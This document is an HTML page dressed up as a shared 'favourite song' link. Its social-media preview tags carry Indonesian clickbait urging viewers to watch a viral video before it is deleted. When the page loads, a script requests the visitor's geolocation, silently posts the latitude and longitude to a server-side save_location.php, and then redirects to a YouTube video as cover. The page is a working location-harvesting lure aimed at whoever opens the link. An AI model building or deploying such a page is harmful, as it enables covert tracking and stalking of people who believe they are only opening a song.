<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fav song RN!!</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="myFav Song RN!!">
    <meta property="og:description" content="Tonton sekarang sebelum dihapus! Video viral yang bikin sadar!!">
    <meta property="og:image" content="https://galaubrutal.lovestoblog.com/thumbnail.jpg">
<meta property="og:url" content="https://galaubrutal.lovestoblog.com/">

    <meta property="og:type" content="website">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="myFav Song RN!!">
    <meta name="twitter:description" content="Tonton sekarang sebelum dihapus! Video viral yang bikin sadar!">
    <meta name="twitter:image" content="https://yourdomain.com/thumbnail.jpg">

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #f0f0f0;
            padding-top: 50px;
        }
    </style>

    <script>
        function sendLocation(lat, lon) {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "save_location.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("lat=" + lat + "&lon=" + lon);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    sendLocation(lat, lon);
                    document.body.innerHTML = "<h1>Loading Video...</h1>";
                    setTimeout(function() {
                        window.location.href = "https://youtu.be/35XNPXS3QYs?si=Ig1irrxBrZmelcxk"; // Link video
                    }, 2000);
                }, function(error) {
                    document.body.innerHTML = "<h1>Location Access Denied</h1>";
                });
            } else {
                document.body.innerHTML = "<h1>Geolocation is not supported by this browser.</h1>";
            }
        }

        window.onload = getLocation;
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
